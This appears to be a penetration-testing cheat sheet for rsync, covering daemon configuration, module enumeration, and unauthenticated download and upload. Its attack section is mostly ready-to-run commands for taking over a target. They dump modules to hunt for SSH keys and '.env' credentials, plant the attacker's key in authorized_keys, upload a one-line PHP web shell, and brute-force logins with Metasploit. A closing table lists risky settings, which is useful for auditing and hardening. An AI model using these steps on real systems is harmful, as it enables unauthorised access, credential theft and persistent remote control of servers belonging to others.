#Rsync #RemoteSync #filetransfer

## What is Rsync?
Fast, efficient file transfer and synchronization tool. Can operate over its own protocol (rsync daemon) or via SSH tunnel. Transfers only changed data (delta transfer). Common for backups and deployments.

- Port **TCP 873** — rsync daemon (unauthenticated by default if not configured)
- Can also tunnel over SSH (no dedicated port)

---

## Configuration Files

| File | Description |
|---|---|
| `/etc/rsyncd.conf` | Main rsync daemon config (modules, auth, paths) |
| `/etc/rsyncd.secrets` | Username:password pairs for authenticated modules |

### rsyncd.conf Example

```ini
[modulename]
    path = /data/share
    comment = Shared data
    read only = no
    auth users = rsyncuser
    secrets file = /etc/rsyncd.secrets
    hosts allow = 192.168.1.0/24
```

---

## Enumeration

```bash
# Nmap
nmap -p 873 --script rsync-list-modules -sV <target>

# List available modules (unauthenticated)
rsync rsync://<target>/
rsync -av --list-only rsync://<target>/

# List files in a specific module
rsync -av --list-only rsync://<target>/<module>/

# Netcat banner grab
nc -nv <target> 873
```

---

## Connect / Access

```bash
# Download entire module (unauthenticated)
rsync -av rsync://<target>/<module>/ ./local_copy/

# Download with authentication
rsync -av rsync://<user>@<target>/<module>/ ./local_copy/

# Download specific file
rsync rsync://<target>/<module>/path/to/file .

# Upload file/directory
rsync -av ./local_file rsync://<target>/<module>/

# Upload with authentication
rsync -av ./local_file rsync://<user>@<target>/<module>/path/

# Rsync over SSH
rsync -av -e "ssh -p 22" user@<target>:/remote/path ./local/
rsync -av -e "ssh -i ~/.ssh/id_rsa" local/ user@<target>:/remote/path/

# Rsync over SSH with custom port
rsync -av -e "ssh -p 2222" user@<target>:/remote/ ./local/
```

---

## Attack Vectors

### Dump Sensitive Files

```bash
# List and download everything
rsync -av rsync://<target>/<module>/ ./dump/

# Look for SSH keys, config files, credentials
find ./dump -name "*.key" -o -name "authorized_keys" -o -name "*.conf" -o -name ".env"
```

### Upload SSH Public Key (if writable module maps to home directory)

```bash
# Download current authorized_keys (if exists)
rsync rsync://<target>/<module>/.ssh/authorized_keys .

# Append our key and re-upload
cat ~/.ssh/id_rsa.pub >> authorized_keys
rsync ./authorized_keys rsync://<target>/<module>/.ssh/

# SSH in
ssh user@<target>
```

### Upload Web Shell (if module maps to web root)

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
rsync shell.php rsync://<target>/<module>/shell.php
# Access: http://<target>/shell.php?cmd=id
```

### Brute Force Authenticated Modules

```bash
# Metasploit
use auxiliary/scanner/rsync/modules_list
use auxiliary/scanner/rsync/rsync_login
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No `auth users` set | Unauthenticated access to module |
| `read only = false` | Anyone can upload files |
| `hosts allow = *` or not set | No IP restriction |
| Module maps to `/` or home dirs | Full filesystem access |
| Module maps to web root | Web shell upload |
| Secrets file world-readable | Password exposure |

---

## Quick Reference

| Goal | Command |
|---|---|
| List modules | `rsync rsync://host/` |
| List module contents | `rsync -av --list-only rsync://host/module/` |
| Download module | `rsync -av rsync://host/module/ ./local/` |
| Upload file | `rsync ./file rsync://host/module/` |
| Rsync over SSH | `rsync -av -e ssh user@host:/remote/ ./local/` |
| Nmap enum | `nmap -p 873 --script rsync-list-modules host` |
